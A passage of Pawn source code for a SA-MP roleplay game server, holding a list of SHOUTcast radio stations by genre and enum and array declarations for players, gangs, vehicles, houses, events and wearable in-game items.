{"PONdENDS","http://yp.shoutcast.com/sbin/tunein-station.pls?id=221874"},
{"Reggae141","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1280855"},
{"Reggae Radio Rasta","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1266989"},
{"1.FM ReggaeTrade","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1272779"},
{"Raggakings","http://yp.shoutcast.com/sbin/tunein-station.pls?id=123431"},
{"Black Roots Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=231554"},

// Rock (200-209)
{"181.FM - The Buzz","http://yp.shoutcast.com/sbin/tunein-station.pls?id=37586"},
{"NOISEfm.pl","http://yp.shoutcast.com/sbin/tunein-station.pls?id=3121111"},
{"Radio Paradise","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1354805"},
{"MUSIK.ROCK","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1275071"},
{"181.FM Good Time Oldies","http://yp.shoutcast.com/sbin/tunein-station.pls?id=25287"},
{"181.fm Rock 181","http://yp.shoutcast.com/sbin/tunein-station.pls?id=302754"},
{"ROCKY FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=684390"},
{"ChroniX Aggression","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377260"},
{"Rockenfolie","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2865"},
{"80s SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=737152"},

// Talk (210-219)
{"Alex Jones","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1026951"},
{"AM 1710 Antioch","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2699"},
{"89.3 KPCC","http://yp.shoutcast.com/sbin/tunein-station.pls?id=179361"},
{"The Very Best Of Art Bell","http://yp.shoutcast.com/sbin/tunein-station.pls?id=47835"},
{"KCRW ALL NEWS","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1279013"},
{"2GB Sydney Talk","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1346749"},
{"Broadband Comedy Network","http://yp.shoutcast.com/sbin/tunein-station.pls?id=3095781"},
{"181.FM Comedy Club","http://yp.shoutcast.com/sbin/tunein-station.pls?id=52807"},
{"Social Crime Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=179709"},
{"Radio Carlin","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1495362"}
};

enum pCrime
{
	pBplayer[32],
	pAccusing[32],
	pAccusedof[32],
	pVictim[32],
};
new PlayerCrime[MAX_PLAYERS][pCrime];


enum EventInfoEnum
{
	EventAdvisor,
	EventStatus,
	EventType,
	EventJT[128],
	Float: EventHealth,
	Float: EventArmor,
	Float: EventPositionX,
	Float: EventPositionY,
	Float: EventPositionZ,
	EventInterior,
	EventWorld,
	EventWeapons[5],
	EventTeamColor[2],
    EventTeamSkin[2],
    EventLimit,
    EventTime,
	EventFootRace,
    EventPlayers,
    EventRequest,
    EventStartRequest,
    EventCreator,
    EventStaff[5],
    EventJoinStaff,
    VipOnly,
    Float: EventTeamPosX1,
    Float: EventTeamPosY1,
    Float: EventTeamPosZ1,
    Float: EventTeamPosX2,
    Float: EventTeamPosY2,
    Float: EventTeamPosZ2,
    EventFaction,
    EventFamily,
    EventToggleHeal,
	EventToggleAnims
}
new EventInfo[EventInfoEnum];

enum reportinfo
{
	HasBeenUsed,
	Report[128],
	ReportFrom,
	CheckingReport,
 	TimeToExpire,
	BeingUsed,
	ReportExpireTimer,
	ReplyTimerr,
	BugReport
}

new Reports[MAX_REPORTS][reportinfo];
new ListItemReportId[MAX_PLAYERS][40];
new CancelReport[MAX_PLAYERS];

enum Spikes
{
	Float:sX,
	Float:sY,
	Float:sZ,
	sObjectID,
	sDeployedBy[MAX_PLAYER_NAME],
	sDeployedAt[MAX_ZONE_NAME]
}
new SpikeStrips[10][Spikes];

enum fInfo
{
	FamilyTaken,
	FamilyName[42],
	FamilyMOTD[65],
	FamilyColor,
	FamilyTurfTokens,
	FamilyLeader[MAX_PLAYER_NAME],
	FamilyMembers,
	Float:FamilySpawn[4],
	FamilyInterior,
	FamilyCash,
	FamilyBank,
	FamilyMats,
	FamilyPot,
	FamilyCrack,
	Float:FamilySafe[3],
	FamilyUSafe,
	FamilyRank1[20],
	FamilyRank2[20],
	FamilyRank3[20],
	FamilyRank4[20],
	FamilyRank5[20],
	FamilyRank6[20],
	FamilyPickup,
	FamilyMaxSkins,
	FamilySkins[8],
	Float: FamilyEntrance[4],
	Float: FamilyExit[4],
	FamilyEntrancePickup,
	FamilyExitPickup,
	Text3D:FamilyEntranceText,
	Text3D:FamilyExitText,
	FamilyCustomMap,
	FamilyVirtualWorld,
	FamilyResetSpawns,
	FamilyGuns[10],
};
new FamilyInfo[MAX_FAMILY][fInfo];

enum cdInfo
{
	cdOwned,
	cdOwner[MAX_PLAYER_NAME],
	Float: cdEntranceX,
	Float: cdEntranceY,
	Float: cdEntranceZ,
	Float: cdExitX,
	Float: cdExitY,
	Float: cdExitZ,
	cdMessage[128],
	cdTill,
	cdInterior,
	Float: cdVehicleSpawn[4],
	Float: cdRadius,
	cdPrice,
	Float: cdVehicleSpawnX[MAX_DEALERSHIPVEHICLES],
	Float: cdVehicleSpawnY[MAX_DEALERSHIPVEHICLES],
	Float: cdVehicleSpawnZ[MAX_DEALERSHIPVEHICLES],
	Float: cdVehicleSpawnAngle[MAX_DEALERSHIPVEHICLES],
	cdVehicleModel[MAX_DEALERSHIPVEHICLES],
	cdVehicleCost[MAX_DEALERSHIPVEHICLES],
	cdVehicleId[MAX_DEALERSHIPVEHICLES], // non-saved
	cdPickupID, // non-saved
	Text3D:cdTextLabel, // non-saved
	Text3D:cdVehicleLabel[MAX_DEALERSHIPVEHICLES], // non-saved
	cdDonator,
};
new CarDealershipInfo[MAX_CARDEALERSHIPS][cdInfo];

enum fvInfo
{
    fvId,
	fvModelId,
	Float: fvSpawnx,
	Float: fvSpawny,
	Float: fvSpawnz,
	Float: fvSpawna,
	Float: fvSpawnxtmp,
	Float: fvSpawnytmp,
	Float: fvSpawnztmp,
	Float: fvSpawnatmp,
	fvLock,
	fvLocked,
	fvPaintJob,
	fvColor1,
	fvColor2,
	fvMods[MAX_MODS],
	fvPrice,
	fvImpounded,
	Float:fvFuel,
};

new FamilyVehicleInfo[MAX_FAMILY][MAX_GANG_VEHICLES][fvInfo];

enum fPoint
{
	Float:Pointx,
	Float:Pointy,
	Float:Pointz,
	Type,
	Vulnerable,
	MatPoint,
	CratePoint,
	Announced,
	ClaimerId,
	ClaimerTeam,
	TimeToClaim,
	TimeLeft,
	Owner[32],
	PlayerNameCapping[MAX_PLAYER_NAME],
	CapperName[MAX_PLAYER_NAME],
	Name[32],
	TakeOverTimerStarted,
	TakeOverTimer,
	Text3D:TextLabel,
	CaptureTimerEx2,
	Stock,
	//Text3D:CaptureProccess,
	Text3D:CaptureProgress,
	CaptureProccessEx,
	Float: Capturex,
	Float: Capturey,
	Float: Capturez,
	PointPickupID,
	Bar:PointBarID,
}
new Points[MAX_POINTS][fPoint];

enum pFishing
{
	pFish1[20],
	pFish2[20],
	pFish3[20],
	pFish4[20],
	pFish5[20],
	pWeight1,
	pWeight2,
	pWeight3,
	pWeight4,
	pWeight5,
	pFid1,
	pFid2,
	pFid3,
	pFid4,
	pFid5,
	pLastFish,
	pFishID,
	pLastWeight,
};
new Fishes[MAX_PLAYERS][pFishing];

enum hNews
{
	hTaken1,
	hTaken2,
	hTaken3,
	hTaken4,
	hTaken5,
	hTaken6,
	hTaken7,
	hTaken8,
	hTaken9,
	hTaken10,
	hTaken11,
	hTaken12,
	hTaken13,
	hTaken14,
	hTaken15,
	hTaken16,
	hTaken17,
	hTaken18,
	hTaken19,
	hTaken20,
	hTaken21,
	hAdd1[64],
	hAdd2[64],
	hAdd3[64],
	hAdd4[64],
	hAdd5[64],
	hAdd6[64],
	hAdd7[64],
	hAdd8[64],
	hAdd9[64],
	hAdd10[64],
	hAdd11[64],
	hAdd12[64],
	hAdd13[64],
	hAdd14[64],
	hAdd15[64],
	hAdd16[64],
	hAdd17[64],
	hAdd18[64],
	hAdd19[64],
	hAdd20[64],
	hAdd21[64],
	hContact1[64],
	hContact2[64],
	hContact3[64],
	hContact4[64],
	hContact5[64],
	hContact6[64],
	hContact7[64],
	hContact8[64],
	hContact9[64],
	hContact10[64],
	hContact11[64],
	hContact12[64],
	hContact13[64],
	hContact14[64],
	hContact15[64],
	hContact16[64],
	hContact17[64],
	hContact18[64],
	hContact19[64],
	hContact20[64],
	hContact21[64],
};
new News[hNews];

enum HoldingEnumAll
{
	holdingmodelid,
	holdingprice,
	holdingmodelname[24]
}

new HoldingObjectsCop[14][HoldingEnumAll] = {
{18642,100,"Taser1"},
{19141,250,"SWATHelmet1"},
{19142,250,"SWATArmour1"},
{18636,100,"PoliceCap1"},
{19099,100,"PoliceCap2"},
{19100,100,"PoliceCap3"},
{18637,100,"PoliceShield1"},
{19161,100,"PoliceHat1"},
{19162,100,"PoliceHat2"},
{19200,100,"PoliceHelmet1"},
{19138,100,"PoliceGlasses1"},
{19139,100,"PoliceGlasses2"},
{19140,100,"PoliceGlasses3"},
{19347,250,"Badge"}
};

new HoldingObjectsAll[240][HoldingEnumAll] = {
{18642,100,"Taser1"},
{18643,1000,"LaserPointer1"},
{19080,1000,"LaserPointer2"},
{19081,1000,"LaserPointer3"},
{19082,1000,"LaserPointer4"},
{19083,1000,"LaserPointer5"},
{19084,1000,"LaserPointer6"},
{19086,500,"ChainsawDildo1"},
{18675,1000,"SmokePuff"},
{19701,1000,"SmallFlame"},
{18693,1000,"LargeFlame"},
{18698,1000,"Insects"},
{18708,1000,"Bubbles"},
{19141,250,"SWATHelmet1"},
{19142,250,"SWATArmour1"},
{18636,100,"PoliceCap1"},
{19099,100,"PoliceCap2"},
{19100,100,"PoliceCap3"},
{18637,100,"PoliceShield1"},
{19161,100,"PoliceHat1"},
{19162,100,"PoliceHat2"},
{19200,100,"PoliceHelmet1"},
{19138,100,"PoliceGlasses1"},
{19139,100,"PoliceGlasses2"},
{19140,100,"PoliceGlasses3"},
{19347,250,"Badge"},
{18632,100,"FishingRod"},
{18633,150,"Wrench"},
{18634,100,"Crowbar"},
{18635,100,"Hammer"},
{18638,50,"HardHat"},
{19093,50,"HardHat2"},
{19160,50,"HardHat3"},
{18639,50,"BlackHat"},
{18640,70,"Hair"},
{18975,70,"Hair2"},
{19136,70,"Hair3"},
{19274,70,"Hair4"},
{18641,100,"Flashlight"},
{18644,500,"Screwdriver"},
{18865,50,"MobilePhone1"},
{18866,50,"MobilePhone2"},
{18867,50,"MobilePhone3"},
{18868,50,"MobilePhone4"},
{18869,50,"MobilePhone5"},
{18870,100,"MobilePhone6"},
{18871,100,"MobilePhone7"},
{18872,100,"MobilePhone8"},
{18873,100,"MobilePhone9"},
{18874,100,"MobilePhone10"},
{18875,75,"Pager"},
{18890,50,"Rake"},
{18891,50,"Bandana1"},
{18892,50,"Bandana2"},
{18893,50,"Bandana3"},
{18894,50,"Bandana4"},
{18895,50,"Bandana5"},
{18896,50,"Bandana6"},
{18897,50,"Bandana7"},
{18898,50,"Bandana8"},
{18899,50,"Bandana9"},
{18900,50,"Bandana10"},
{18901,75,"Bandana11"},
{18902,75,"Bandana12"},
{18903,75,"Bandana13"},
{18904,75,"Bandana14"},
{18905,75,"Bandana15"},
{18906,75,"Bandana16"},
{18907,75,"Bandana17"},
{18908,75,"Bandana18"},
{18909,75,"Bandana19"},
{18910,75,"Bandana20"},
{18911,100,"Mask1"},
{18912,100,"Mask2"},
{18913,100,"Mask3"},
{18914,100,"Mask4"},
{18915,100,"Mask5"},
{18916,100,"Mask6"},
{18917,100,"Mask7"},
{18918,100,"Mask8"},
{18919,100,"Mask9"},
{18920,100,"Mask10"},
{18921,50,"Beret1"},
{18922,50,"Beret2"},
{18923,75,"Beret3"},
{18924,100,"Beret4"},
{18925,100,"Beret5"},
{18926,50,"Hat1"},
{18927,50,"Hat2"},
{18928,50,"Hat3"},
{18929,50,"Hat4"},
{18930,50,"Hat5"},
{18931,100,"Hat6"},
{18932,100,"Hat7"},
{18933,100,"Hat8"},
{18934,100,"Hat9"},
{18935,100,"Hat10"},
{18936,50,"Helmet1"},
{18937,75,"Helmet2"},
{18938,100,"Helmet3"},
{18939,75,"CapBack1"},
{18940,75,"CapBack2"},
{18941,75,"CapBack3"},
{18942,100,"CapBack4"},
{18943,100,"CapBack5"},
{18944,100,"HatBoater1"},
{18945,125,"HatBoater2"},
{18946,150,"HatBoater3"},
{18947,100,"HatBowler1"},
{18948,100,"HatBowler2"},
{18949,100,"HatBowler3"},
{18950,100,"HatBowler4"},
{18951,100,"HatBowler5"},
{18952,150,"BoxingHelmet"},
{18953,50,"CapKnit1"},
{18954,75,"CapKnit2"},
{18955,75,"CapOverEye1"},
{18956,75,"CapOverEye2"},
{18957,75,"CapOverEye3"},
{18958,75,"CapOverEye4"},
{18959,75,"CapOverEye5"},
{18960,100,"CapRimUp1"},
{18961,75,"CapTrucker1"},
{18962,75,"CowboyHat2"},
{18964,100,"SkullyCap1"},
{18965,125,"SkullyCap2"},
{18966,150,"SkullyCap3"},
{18967,100,"HatMan1"},
{18968,100,"HatMan2"},
{18969,100,"HatMan3"},
{18970,200,"HatTiger"},
{18971,100,"HatCool1"},
{18972,125,"HatCool2"},
{18973,150,"HatCool3"},
{18974,1000,"MaskZorro1"},
{18645,150,"MotorcycleHelmet"},
{18976,100,"MotorcycleHelmet2"},
{18977,100,"MotorcycleHelmet3"},
{18978,125,"MotorcycleHelmet4"},
{18979,150,"MotorcycleHelmet5"},
{19006,50,"GlassesType1"},
{19007,50,"GlassesType2"},
{19008,50,"GlassesType3"},
{19009,50,"GlassesType4"},
{19010,50,"GlassesType5"},
{19011,50,"GlassesType6"},
{19012,50,"GlassesType7"},
{19013,50,"GlassesType8"},
{19014,50,"GlassesType9"},
{19015,50,"GlassesType10"},
{19016,100,"GlassesType11"},
{19017,100,"GlassesType12"},
{19018,100,"GlassesType13"},
{19019,100,"GlassesType14"},
{19020,100,"GlassesType15"},
{19021,100,"GlassesType16"},
{19022,100,"GlassesType17"},
{19023,100,"GlassesType18"},
{19024,100,"GlassesType19"},
{19025,100,"GlassesType20"},
{19026,150,"GlassesType21"},
{19027,150,"GlassesType22"},
{19028,150,"GlassesType23"},
{19029,150,"GlassesType24"},
{19030,150,"GlassesType25"},
{19031,150,"GlassesType26"},
{19032,150,"GlassesType27"},
{19033,150,"GlassesType28"},
{19034,150,"GlassesType29"},
{19035,150,"GlassesType30"},
{19036,200,"HockeyMask1"},
{19037,200,"HockeyMask2"},
{19038,200,"HockeyMask3"},
{19039,50,"WatchType1"},
{19040,50,"WatchType2"},
{19041,50,"WatchType3"},
{19042,50,"WatchType4"},
{19043,50,"WatchType5"},
{19044,50,"WatchType6"},
{19045,50,"WatchType7"},
{19046,100,"WatchType8"},
{19047,100,"WatchType9"},
{19048,100,"WatchType10"},
{19049,100,"WatchType11"},
{19050,100,"WatchType12"},
{19051,100,"WatchType13"},
{19052,100,"WatchType14"},
{19053,100,"WatchType15"},
{19064,1000, "SantaHat1"},
{19065,2000, "SantaHat2"},
{19066,300, "SantaHat3"},
{19067,100, "HoodyHat1"},
{19068,100, "HoodyHat2"},
{19069,100, "HoodyHat3"},
{19078,750, "TheParrot1"},
{19079,750, "TheParrot2"},
{19085,500, "EyePatch"},
{19090,150, "PomPomBlue"},
{19091,150, "PomPomRed"},
{19092,150, "PomPomGreen"},
{19094,200, "BurgerShotHat"},
{19095,50, "CowboyHat1"},
{19096,50, "CowboyHat3"},
{19097,100, "CowboyHat4"},
{19098,100, "CowboyHat5"},
{19101,200, "ArmyHelmet1"},
{19102,200, "ArmyHelmet2"},
{19103,200, "ArmyHelmet3"},
{19104,200, "ArmyHelmet4"},
{19105,200, "ArmyHelmet5"},
{19106,200, "ArmyHelmet6"},
{19107,400, "ArmyHelmet7"},
{19108,400, "ArmyHelmet8"},
{19109,400, "ArmyHelmet9"},
{19110,400, "ArmyHelmet10"},
{19111,400, "ArmyHelmet11"},
{19112,400, "ArmyHelmet12"},
{19113,100, "SillyHelmet1"},
{19114,200, "SillyHelmet2"},
{19115,300, "SillyHelmet3"},
{19116,50, "PlainHelmet1"},
{19117,50, "PlainHelmet2"},
{19118,75, "PlainHelmet3"},
{19119,100, "PlainHelmet4"},
{19120,100, "PlainHelmet5"},
{19137,500, "CluckinBellHat"},
{19163,100, "GimpMask"},
{1210,50, "Briefcase"},
{19421,50, "Headphones1"},
{19422,50, "Headphones2"},
{19423,50, "Headphones3"},
{19424,50, "Headphones4"},
{19350,50, "Moustache1"},
{19351,50, "Moustache2"},
{19352,50, "Tophat"},
{19349,50, "Monocle"},
{19317,50, "Bassguitar"},
{371,500, "Backpack"},
{3044,500, "Cigar"},
{3027,500, "Joint"}
};

enum HoldingEnum
{
	holdingmodelid,
	holdingprice,
	holdingmodelname[24]
}

new HoldingObjects[214][HoldingEnum] = {
{18632,100,"FishingRod"},
{18633,150,"Wrench"},
{18634,100,"Crowbar"},
{18635,100,"Hammer"},
{18638,50,"HardHat"},
{19093,50,"HardHat2"},
{19160,50,"HardHat3"},
{18639,50,"BlackHat"},
{18640,70,"Hair"},
{18975,70,"Hair2"},
{19136,70,"Hair3"},
{19274,70,"Hair4"},
{18641,100,"Flashlight"},
{18644,500,"Screwdriver"},
{18865,50,"MobilePhone1"},
{18866,50,"MobilePhone2"},
{18867,50,"MobilePhone3"},
{18868,50,"MobilePhone4"},
{18869,50,"MobilePhone5"},
{18870,100,"MobilePhone6"},
{18871,100,"MobilePhone7"},
{18872,100,"MobilePhone8"},
{18873,100,"MobilePhone9"},
{18874,100,"MobilePhone10"},
{18875,75,"Pager"},
{18890,50,"Rake"},
{18891,50,"Bandana1"},
{18892,50,"Bandana2"},
{18893,50,"Bandana3"},
{18894,50,"Bandana4"},
{18895,50,"Bandana5"},
{18896,50,"Bandana6"},
{18897,50,"Bandana7"},
{18898,50,"Bandana8"},
{18899,50,"Bandana9"},
{18900,50,"Bandana10"},
{18901,75,"Bandana11"},
{18902,75,"Bandana12"},
{18903,75,"Bandana13"},
{18904,75,"Bandana14"},
{18905,75,"Bandana15"},
{18906,75,"Bandana16"},
{18907,75,"Bandana17"},
{18908,75,"Bandana18"},
{18909,75,"Bandana19"},
{18910,75,"Bandana20"},
{18911,100,"Mask1"},
{18912,100,"Mask2"},
{18913,100,"Mask3"},
{18914,100,"Mask4"},
{18915,100,"Mask5"},
{18916,100,"Mask6"},
{18917,100,"Mask7"},
{18918,100,"Mask8"},
{18919,100,"Mask9"},
{18920,100,"Mask10"},
{18921,50,"Beret1"},
{18922,50,"Beret2"},
{18923,75,"Beret3"},
{18924,100,"Beret4"},
{18925,100,"Beret5"},
{18926,50,"Hat1"},
{18927,50,"Hat2"},
{18928,50,"Hat3"},
{18929,50,"Hat4"},
{18930,50,"Hat5"},
{18931,100,"Hat6"},
{18932,100,"Hat7"},
{18933,100,"Hat8"},
{18934,100,"Hat9"},
{18935,100,"Hat10"},
{18936,50,"Helmet1"},
{18937,75,"Helmet2"},
{18938,100,"Helmet3"},
{18939,75,"CapBack1"},
{18940,75,"CapBack2"},
{18941,75,"CapBack3"},
{18942,100,"CapBack4"},
{18943,100,"CapBack5"},
{18944,100,"HatBoater1"},
{18945,125,"HatBoater2"},
{18946,150,"HatBoater3"},
{18947,100,"HatBowler1"},
{18948,100,"HatBowler2"},
{18949,100,"HatBowler3"},
{18950,100,"HatBowler4"},
{18951,100,"HatBowler5"},
{18952,150,"BoxingHelmet"},
{18953,50,"CapKnit1"},
{18954,75,"CapKnit2"},
{18955,75,"CapOverEye1"},
{18956,75,"CapOverEye2"},
{18957,75,"CapOverEye3"},
{18958,75,"CapOverEye4"},
{18959,75,"CapOverEye5"},
{18960,100,"CapRimUp1"},
{18961,75,"CapTrucker1"},
{18962,75,"CowboyHat2"},
{18964,100,"SkullyCap1"},
{18965,125,"SkullyCap2"},
{18966,150,"SkullyCap3"},
{18967,100,"HatMan1"},
{18968,100,"HatMan2"},
{18969,100,"HatMan3"},
{18970,200,"HatTiger"},
{18971,100,"HatCool1"},
{18972,125,"HatCool2"},
{18973,150,"HatCool3"},
{18974,1000,"MaskZorro1"},
{18645,150,"MotorcycleHelmet"},
{18976,100,"MotorcycleHelmet2"},
{18977,100,"MotorcycleHelmet3"},
{18978,125,"MotorcycleHelmet4"},
{18979,150,"MotorcycleHelmet5"},
{19006,50,"GlassesType1"},
{19007,50,"GlassesType2"},
{19008,50,"GlassesType3"},
{19009,50,"GlassesType4"},
{19010,50,"GlassesType5"},
{19011,50,"GlassesType6"},
{19012,50,"GlassesType7"},
{19013,50,"GlassesType8"},
{19014,50,"GlassesType9"},
{19015,50,"GlassesType10"},
{19016,100,"GlassesType11"},
{19017,100,"GlassesType12"},
{19018,100,"GlassesType13"},
{19019,100,"GlassesType14"},
{19020,100,"GlassesType15"},
{19021,100,"GlassesType16"},
{19022,100,"GlassesType17"},
{19023,100,"GlassesType18"},
{19024,100,"GlassesType19"},
{19025,100,"GlassesType20"},
{19026,150,"GlassesType21"},
{19027,150,"GlassesType22"},
{19028,150,"GlassesType23"},
{19029,150,"GlassesType24"},
{19030,150,"GlassesType25"},
{19031,150,"GlassesType26"},
{19032,150,"GlassesType27"},
{19033,150,"GlassesType28"},
{19034,150,"GlassesType29"},
{19035,150,"GlassesType30"},
{19036,200,"HockeyMask1"},
{19037,200,"HockeyMask2"},
{19038,200,"HockeyMask3"},
{19039,50,"WatchType1"},
{19040,50,"WatchType2"},
{19041,50,"WatchType3"},
{19042,50,"WatchType4"},
{19043,50,"WatchType5"},
{19044,50,"WatchType6"},
{19045,50,"WatchType7"},
{19046,100,"WatchType8"},
{19047,100,"WatchType9"},
{19048,100,"WatchType10"},
{19049,100,"WatchType11"},
{19050,100,"WatchType12"},
{19051,100,"WatchType13"},
{19052,100,"WatchType14"},
{19053,100,"WatchType15"},
{19064,1000, "SantaHat1"},
{19065,2000, "SantaHat2"},
{19066,300, "SantaHat3"},
{19067,100, "HoodyHat1"},
{19068,100, "HoodyHat2"},
{19069,100, "HoodyHat3"},
{19078,750, "TheParrot1"},
{19079,750, "TheParrot2"},
{19085,500, "EyePatch"},
{19090,150, "PomPomBlue"},
{19091,150, "PomPomRed"},
{19092,150, "PomPomGreen"},
{19094,200, "BurgerShotHat"},
{19095,50, "CowboyHat1"},
{19096,50, "CowboyHat3"},
{19097,100, "CowboyHat4"},
{19098,100, "CowboyHat5"},
{19101,200, "ArmyHelmet1"},
{19102,200, "ArmyHelmet2"},
{19103,200, "ArmyHelmet3"},
{19104,200, "ArmyHelmet4"},
{19105,200, "ArmyHelmet5"},
{19106,200, "ArmyHelmet6"},
{19107,400, "ArmyHelmet7"},
{19108,400, "ArmyHelmet8"},
{19109,400, "ArmyHelmet9"},
{19110,400, "ArmyHelmet10"},
{19111,400, "ArmyHelmet11"},
{19112,400, "ArmyHelmet12"},
{19113,100, "SillyHelmet1"},
{19114,200, "SillyHelmet2"},
{19115,300, "SillyHelmet3"},
{19116,50, "PlainHelmet1"},
{19117,50, "PlainHelmet2"},
{19118,75, "PlainHelmet3"},
{19119,100, "PlainHelmet4"},
{19120,100, "PlainHelmet5"},
{19137,500, "CluckinBellHat"},
{19163,100, "GimpMask"},
{1210,50, "Briefcase"},
{19421,50, "Headphones1"},
{19422,50, "Headphones2"},
{19423,50, "Headphones3"},
{19424,50, "Headphones4"},
{19350,50, "Moustache1"},
{19351,50, "Moustache2"},
{19352,50, "Tophat"},
{19349,50, "Monocle"},
{19317,50, "Bassguitar"},
{371,500, "Backpack"},
{3044,500, "Cigar"},
{3027,500, "Joint"}
};

new HoldingBones[][] = {
	"None",
	"Spine",
	"Head",
	"Left upper arm",
	"Right upper arm",
	"Left hand",
	"Right hand",
	"Left thigh",
	"Right thigh",
	"Left foot",
	"Right foot",
	"Right calf",
	"Left calf",
	"Left forearm",
	"Right forearm",
	"Left clavicle",
	"Right clavicle",
	"Neck",
	"Jaw"
};

enum pInfo
{
	pKey[129],
	pLevel,
	pAdmin,
	pAdminName[32],
	pBanAppealer,
	pGangMod,
	// pVip,
	pBanned,
	pPermaBanned,
	pDisabled,
	pIP[16],
	pReg,
	pID,
 	pTut,
	pSex,
	pAge,
	pSkin,
	Float:pPos_x,
	Float:pPos_y,
	Float:pPos_z,
	Float:pPos_r,
	pConnectTime,
	pRespect,
	pNumber,
	pWarns,
	pGang,
	pFaction,
	pLeader,
	pRank,
	pJob,
	pJob2,
	gPupgrade,
	Float:pSarmor,
	pCash,
	pBank,
	pInsurance,
	pCrimes,
	pArrested,
	pWantedLevel,
	Float:pHealth,
	Float:pArmor,
	pPot,
	pCrack,
	pPackages,
	pCrates,
	pRadio,
	pRadioFreq,
	pPhoneBook,
	pDice,
	pCDPlayer,
	pMats,
	pRope,
	pCigar,
	pSprunk,
	pSpraycan,
	pHouse,
	pHouse2,
	pRenting,
	pInt,
	pVW,
	pJailed,
	pJailTime,
	pGuns[12],
	pAGuns[12],
	pPayCheck,
	pPayReady,
	pHospital,
	pDetSkill,
	pLawSkill,
	pSexSkill,
	pDrugsSkill,
	pSmugSkill,
	pArmsSkill,
	pMechSkill,
	pFishSkill,
	pBoxSkill,
	pTruckSkill,
	pCarSkill,
	//pCraftSkill,
	pLawyerTime,
	pLawyerFreeTime,
	pDrugsTime,
	pMechTime,
	pSexTime,
	pCarTime,
	pFishes,
	pBiggestFish,
	pLockCar, // non-saved
	pWeedObject,
	Float: pWeedPos[3],
	pWeedVW,
	pWeedInt,
	pWeedGrowth,
	pWSeeds,
	pWins,
	pLoses,
	pFightStyle,
	pScrewdriver,
	pSmslog,
	pWristwatch,
	pTire,
	pFirstaid,
	pRccam,
	pReceiver,
	pGPS,
	pSweep,
	pSweepLeft,
	pBugged,
	pVehicleKeys,
	pVehicleKeysFrom,
	pDuty,
	pCarLic,
	pFlyLic,
	pBoatLic,
	pFishLic,
	pGunLic,
	pDivision,
	pLiveBanned,
	pTicketTime,
	pHeadValue,
	pContractBy[32],
	pContractDetail[64],
	pC4,
	pC4Get,
	pC4Used,
	pBombs,
	pCHits,
	pFHits,
	pPrisonedBy[MAX_PLAYER_NAME],
	pPrisonReason[128],
	pAcceptReport,
	pTrashReport,
	pAccent,
	pNMute,
	pNMuteTotal,
	pADMute,
	pADMuteTotal,
	pRMuted,
	pRMutedTotal,
	pRMutedTime,
	pSpeedo,
	pGCMuted,
	pGCMutedTime,
	pCallsAccepted,
	pHelper,
	pPatientsDelivered,
	pTriageTime,
	pMarried,
	pMarriedTo[MAX_PLAYER_NAME],
	pKillLog0[128],
	pKillLog1[128],
	pKillLog2[128],
	pKillLog3[128],
	pKillLog4[128],
	pKillLog5[128],
	pKillLog6[128],
	pKillLog7[128],
	pKillLog8[128],
	pKillLog9[128],
	pFlag[128],
	pReferredBy[MAX_PLAYER_NAME],
	pRefTokens,
	pRefTokensOffline,
	pWalkStyle,
	pVIPTokens,
	pVip,
	ddVIP,
	pVMuted,
};
new PlayerInfo[MAX_PLAYERS + 1][pInfo];

enum pvInfo
{
    Float:pvPosX,
	Float:pvPosY,
	Float:pvPosZ,
 	Float:pvPosAngle,
	pvId,
	pvRealID,
	pvModelId,
	pvLock,
	pvLocked,
	pvPaintJob,
	pvColor1,
	pvColor2,
	pvMods[MAX_MODS],
	pvAllowedPlayerId,
	pvPark,
	pvNumberPlate[32],
	pvPrice,
	pvTicket,
	pvWeapons[3],
	pvWepUpgrade,
	pvImpounded,
	pvSpawned,
	pvDisabled,
	Float: pvFuel,
};
new PlayerVehicleInfo[MAX_PLAYERS+1][MAX_PLAYERVEHICLES][pvInfo];

enum ptInfo
{
    ptModelID,
    ptRealID,
	ptBone,
    Float:ptPosX,
	Float:ptPosY,
	Float:ptPosZ,
	Float:ptRotX,
	Float:ptRotY,
	Float:ptRotZ,
	Float:ptScaleX,
	Float:ptScaleY,
	Float:ptScaleZ,
};
new PlayerToyInfo[MAX_PLAYERS+1][MAX_PLAYERTOYS][ptInfo];

enum hInfo
{
	hOwned,
	hLevel,
	hHInteriorWorld,
	hCustomInterior,
	//hDescription[8],
	hOwner[MAX_PLAYER_NAME],
	Float: hExteriorX,
	Float: hExteriorY,
	Float: hExteriorZ,
	Float: hExteriorR,
	Float: hExteriorA,
	Float: hInteriorX,
	Float: hInteriorY,
	Float: hInteriorZ,
	Float: hInteriorR,
	Float: hInteriorA,
	hLock,
	hRentable,
	hRentFee,
	hValue,
	hSafeMoney,
	hPot,
	hCrack,
	hMaterials,
	hWeapons[5],
	hGLUpgrade,
	hPickupID,
	Text3D: hTextID,
	hCustomExterior,
};
new HouseInfo[MAX_HOUSES][hInfo];

enum dmpInfo
{
	dmpMapIconID,
	Float: dmpPosX,
	Float: dmpPosY,
	Float: dmpPosZ,
	dmpMarkerType,
	dmpColor,
	dmpVW,
	dmpInt,
}
new DMPInfo[MAX_DMAPICONS][dmpInfo];

enum ddInfo
{
	ddDescription[128],
	ddPickupID,
	Text3D: ddTextID,
	ddCustomInterior,
	ddExteriorVW,
	ddExteriorInt,
	ddInteriorVW,
	ddInteriorInt,
	Float: ddExteriorX,
	Float: ddExteriorY,
	Float: ddExteriorZ,
	Float: ddExteriorA,
	Float: ddInteriorX,
	Float: ddInteriorY,
	Float: ddInteriorZ,
	Float: ddInteriorA,
	ddCustomExterior,
	ddVIP,
	ddGang,
	ddFaction,
	ddAdmin,
	ddWanted,
	ddVehicleAble,
	ddColor,
	ddPickupModel,
	ddPass[24],
	ddLocked,
	ddNotEditable,
};
new DDoorsInfo[MAX_DDOORS][ddInfo];

enum bbInfo
{
    Float:bbPosX,
	Float:bbPosY,
